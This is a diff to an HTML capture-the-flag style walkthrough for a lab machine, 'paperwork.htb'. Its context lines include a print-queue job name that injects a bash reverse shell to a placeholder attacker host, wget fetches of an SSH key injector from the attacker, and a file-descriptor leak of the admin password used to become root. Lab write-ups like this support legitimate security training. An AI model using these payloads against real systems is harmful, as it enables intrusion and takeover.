@@ -47,7 +47,7 @@
         <div class="note-content">
           <h2>1. Reconnaissance</h2>
           <h3>Ports Scan</h3>
-          <pre><code>rustscan -a &lt;target-ip&gt; -- -sC -sV -oA nmap-result</code></pre>
+          <pre><code>rustscan -a <span class="ph">&lt;target-ip&gt;</span> -- -sC -sV -oA nmap-result</code></pre>
           <p><strong>Open Ports:</strong></p>
           <ul>
             <li><strong>22/tcp</strong> – SSH (OpenSSH 10.0p2)</li>
@@ -57,7 +57,7 @@
           <div class="callout info">
             <strong>💡 Info</strong>
             Make sure to register the hostname and adjust your MTU to avoid connection issues:
-            <pre><code>echo '&lt;target-ip&gt; paperwork.htb' | sudo tee -a /etc/hosts
+            <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> paperwork.htb' | sudo tee -a /etc/hosts
 sudo ip link set dev tun0 mtu 1300</code></pre>
           </div>
           <h3>Enumeration</h3>
@@ -80,9 +80,9 @@ TARGET = "paperwork.htb"
 PORT   = 1515
 QUEUE  = "archive_intake" # confirmed from the web page
 
-LHOST = "&lt;attacker-ip&gt;"
+LHOST = "<span class="ph">&lt;attacker-ip&gt;</span>"
 LPORT = 4444
-payload = f"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1'"
+payload = f"bash -c 'bash -i &gt;&amp; /dev/tcp/<span class="ph">&lt;attacker-ip&gt;</span>/4444 0&gt;&amp;1'"
 job_name = f"x'; {payload} ; echo '"
 control_file = f"H kali\nP root\nJ {job_name}\n"
 cf_bytes = control_file.encode()
@@ -145,8 +145,8 @@ print("[+] SSH Key injected!")</code></pre>
           <pre><code>python3 -m http.server</code></pre>
           <p><strong>On target machine (as <code>lp</code>):</strong></p>
           <pre><code>cd /tmp
-wget http://&lt;attacker-ip&gt;:8000/id_rsa_archivist.pub
-wget http://&lt;attacker-ip&gt;:8000/putsshkey.py
+wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/id_rsa_archivist.pub
+wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/putsshkey.py
 python3 putsshkey.py
 # [+] SSH Key injected!</code></pre>
           <p><strong>Back on attacker machine:</strong></p>
@@ -191,7 +191,7 @@ for cmsg_level, cmsg_type, cmsg_data in ancillary:
 s.close()</code></pre>
           <p>Execute the script to leak the password:</p>
           <pre><code>python3 leakfd.py
-# [+] Leaked FD 5 content: ADMIN_PASSWORD=&lt;password&gt;</code></pre>
+# [+] Leaked FD 5 content: ADMIN_PASSWORD=<span class="ph">&lt;password&gt;</span></code></pre>
           <p>Switch to <code>root</code>:</p>
           <pre><code>su root
 # Enter the leaked password
